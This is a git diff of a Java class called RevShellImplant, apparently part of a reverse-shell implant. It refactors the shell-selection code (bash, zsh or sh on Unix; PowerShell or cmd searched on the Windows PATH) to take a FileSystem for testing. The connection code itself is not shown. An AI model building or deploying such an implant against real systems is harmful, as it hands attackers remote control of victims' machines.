@@ -5,6 +5,8 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
+import java.nio.file.FileSystem;
+import java.nio.file.FileSystems;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.time.Duration;
@@ -158,7 +160,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
     }
 
     /**
-     * Find the most preferred shell.
+     * Find the most preferred shell depending on the operating system and what's available.
      *
      * @return maybe a path to an executable file
      */
@@ -166,21 +168,22 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         String osName = System.getProperty("os.name").toLowerCase();
         if (osName.startsWith("windows")) {
             String pathEnv = System.getenv("PATH");
-            return findWindowsShellExecutable(pathEnv);
+            return findWindowsShellExecutable(FileSystems.getDefault(), pathEnv);
         } else if (osName.startsWith("linux")) {
-            return findUnixShellExecutable();
+            return findUnixShellExecutable(FileSystems.getDefault());
         } else if (osName.startsWith("mac")) {
-            return findUnixShellExecutable();
+            return findUnixShellExecutable(FileSystems.getDefault());
         } else {
             return Optional.empty();
         }
     }
 
-    static Optional<Path> findUnixShellExecutable() {
+    // Separate method for testability.
+    static Optional<Path> findUnixShellExecutable(FileSystem fs) {
         List<Path> candidates = Arrays.asList(
-                Path.of("/bin/bash"),
-                Path.of("/bin/zsh"),
-                Path.of("/bin/sh")
+                fs.getPath("/bin/bash"),
+                fs.getPath("/bin/zsh"),
+                fs.getPath("/bin/sh")
         );
         for (Path candidate : candidates) {
             if (Files.exists(candidate) && Files.isExecutable(candidate)) {
@@ -191,7 +194,8 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         return Optional.empty();
     }
 
-    static Optional<Path> findWindowsShellExecutable(String pathEnv) {
+    // Separate method for testability.
+    static Optional<Path> findWindowsShellExecutable(FileSystem fs, String pathEnv) {
         if (pathEnv == null || pathEnv.isEmpty()) {
             return Optional.empty();
         }
@@ -199,9 +203,11 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         Optional<Path> powershell = Optional.empty();
         Optional<Path> cmd = Optional.empty();
 
-        String[] binPaths = pathEnv.split(File.pathSeparator);
+        // PowerShell can exist on some various paths depending on the version and how it was installed.
+        // cmd is expected to always be in the same place, but do what Windows does and search the PATH for it.
+        String[] binPaths = pathEnv.split(";");
         for (String binPath : binPaths) {
-            Path path = Path.of(binPath);
+            Path path = fs.getPath(binPath);
             if (Files.exists(path) && Files.isDirectory(path)) {
                 if (powershell.isEmpty()) {
                     Path candidate = path.resolve("powershell.exe");
@@ -219,6 +225,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
             }
         }
 
+        // PowerShell is preferred over cmd but cmd is better than nothing.
         if (powershell.isPresent()) {
             return powershell;
         } else if (cmd.isPresent()) {
